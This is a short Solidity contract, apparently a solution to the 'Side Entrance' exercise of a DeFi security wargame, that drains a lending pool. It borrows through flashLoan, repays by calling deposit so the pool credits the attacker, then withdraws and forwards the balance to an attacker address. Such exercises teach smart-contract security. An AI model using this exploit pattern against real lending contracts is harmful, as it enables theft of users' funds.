// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {SideEntranceLenderPool} from "./SideEntranceLenderPool.sol";
import {console} from "hardhat/console.sol";

contract AttackSideEntranceLenderPool {
    SideEntranceLenderPool public immutable pool;
    address public immutable attacker;

    constructor(SideEntranceLenderPool _pool, address _attacker) {
        pool = _pool;
        attacker = _attacker;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        pool.withdraw();

        (bool success, ) = attacker.call{value: address(this).balance}("");
        require(success, "AttackSideEntranceLenderPool: withdraw failed");
    }

    function attack(uint256 _amount) external {
        pool.flashLoan(_amount);
    }

    receive() external payable {}
}